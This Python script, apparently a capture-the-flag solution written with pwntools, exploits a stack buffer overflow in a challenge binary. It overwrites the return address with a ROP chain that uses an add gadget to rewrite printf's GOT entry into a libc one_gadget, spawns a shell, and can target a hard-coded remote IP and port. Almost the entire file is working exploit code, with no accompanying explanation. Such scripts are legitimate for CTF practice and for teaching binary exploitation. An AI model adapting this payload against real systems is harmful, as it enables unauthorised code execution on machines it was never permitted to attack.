#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# change -l0 to -l1 for more gadgets
def one_gadget(filename, base_addr=0):
  return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l0', filename]).decode().split(' ')]

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./chall_patched')
libc = ELF('./libc.so.6')
rop = ROP(exe)

host, port = "65.21.255.31", "13370"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process(exe.path)

onegadgets = one_gadget('libc.so.6')
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]
add_gadget = 0x00000000004011fc # add dword ptr [rbp - 0x3d], ebx ; nop ; ret
pop_gadget = 0x000000000040142a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret

sla('size: ', '0')
payload = b'A'*0x40+p64(0x404a00)+p64(pop_gadget)+p64( onegadgets[1] - libc.sym['printf'])+p64(exe.got['printf']+0x3d)+p64(0)*4+p64(add_gadget)+p64(exe.sym['printf'])
sla('data: ', payload)

p.interactive()

